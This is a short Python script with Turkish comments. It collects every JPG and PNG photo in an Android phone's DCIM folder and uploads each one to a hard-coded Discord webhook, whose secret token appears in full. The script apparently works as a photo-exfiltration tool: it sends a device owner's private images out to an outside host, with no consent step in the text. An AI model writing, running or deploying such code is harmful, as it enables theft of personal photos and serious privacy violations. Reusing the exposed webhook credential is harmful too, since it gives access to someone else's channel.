import os
import requests
import time
from tqdm import tqdm

WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"  # Kendi Discord webhook adresini buraya yaz

def send_to_discord(image_path):
    try:
        with open(image_path, "rb") as f:
            files = {"file": f}
            response = requests.post(WEBHOOK_URL, files=files, timeout=30)
            return response.status_code == 204 or response.status_code == 200
    except Exception as e:
        print(f"Hata: {e} - {image_path}")
        return False

def main():
    image_dir = "/storage/emulated/0/DCIM/"
    # Bütün alt klasörlerdeki fotoğrafları bul
    image_files = []
    for root, dirs, files in os.walk(image_dir):
        for file in files:
            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                image_files.append(os.path.join(root, file))

    print(f"Toplam {len(image_files)} fotoğraf bulundu. Gönderiliyor...")

    # Sırayla, her 1 saniyede bir gönder
    for image_path in tqdm(image_files, desc="YÜKLENİYOR", unit="foto"):
        if send_to_discord(image_path):
            time.sleep(1)  # Her gönderimden sonra 1 saniye bekle
        else:
            print(f"Fotoğraf gönderilemedi: {image_path}")

if __name__ == "__main__":
    main()
